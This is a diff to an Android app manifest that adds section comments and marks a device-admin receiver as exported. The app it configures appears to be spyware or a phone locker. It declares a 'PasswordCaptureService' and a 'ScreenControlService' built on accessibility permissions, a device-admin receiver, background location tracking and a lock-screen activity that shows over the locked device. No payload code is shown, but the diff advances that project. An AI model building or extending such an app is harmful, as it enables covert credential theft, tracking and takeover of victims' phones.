@@ -35,6 +35,7 @@
         android:usesCleartextTraffic="true"
         tools:targetApi="31">
 
+        <!-- ===== MAIN ACTIVITY ===== -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -45,6 +46,7 @@
             </intent-filter>
         </activity>
 
+        <!-- ===== LOCK SCREEN ACTIVITY ===== -->
         <activity
             android:name=".LockScreenActivity"
             android:exported="false"
@@ -52,15 +54,18 @@
             android:showWhenLocked="true"
             android:turnScreenOn="true" />
 
+        <!-- ===== BACKGROUND SERVICE ===== -->
         <service
             android:name=".BackgroundService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="location" />
 
+        <!-- ===== DEVICE ADMIN RECEIVER ===== -->
         <receiver
             android:name=".AdminReceiver"
-            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
             <meta-data
                 android:name="android.app.device_admin"
                 android:resource="@xml/device_admin" />
@@ -69,6 +74,7 @@
             </intent-filter>
         </receiver>
 
+        <!-- ===== SCREEN CONTROL SERVICE ===== -->
         <service
             android:name=".ScreenControlService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
@@ -81,6 +87,7 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
+        <!-- ===== PASSWORD CAPTURE SERVICE ===== -->
         <service
             android:name=".PasswordCaptureService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
